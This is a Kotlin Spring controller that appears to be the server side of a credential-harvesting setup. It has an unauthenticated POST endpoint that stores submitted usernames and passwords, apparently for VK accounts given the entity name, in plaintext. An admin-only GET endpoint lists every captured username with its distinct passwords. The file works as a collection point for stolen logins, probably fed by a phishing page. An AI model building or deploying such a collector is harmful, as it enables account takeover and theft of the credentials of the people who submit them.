package app.controllers

import app.models.VKEntity
import app.repositories.PasswordRepository
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.http.HttpStatus.CREATED
import org.springframework.http.MediaType
import org.springframework.security.access.annotation.Secured
import org.springframework.web.bind.annotation.*
import org.springframework.web.bind.annotation.RestController

@RestController
open class PasswordsRestController {
	@Autowired
	private lateinit var repository : PasswordRepository

	@PostMapping("/passwords" , consumes = [MediaType.APPLICATION_JSON_UTF8_VALUE])
	@ResponseStatus(code = CREATED)
	open fun savePassword(@RequestBody user : VKEntity) {
		repository.save(user)
	}

	@GetMapping("/passwords")
	@Secured("ROLE_ADMIN")
	open fun collect() : Map<String , List<String>> = repository
			.findAll()
			.groupBy(VKEntity::username , VKEntity::password)
			.mapValues {
				it.value.distinct()
			}

}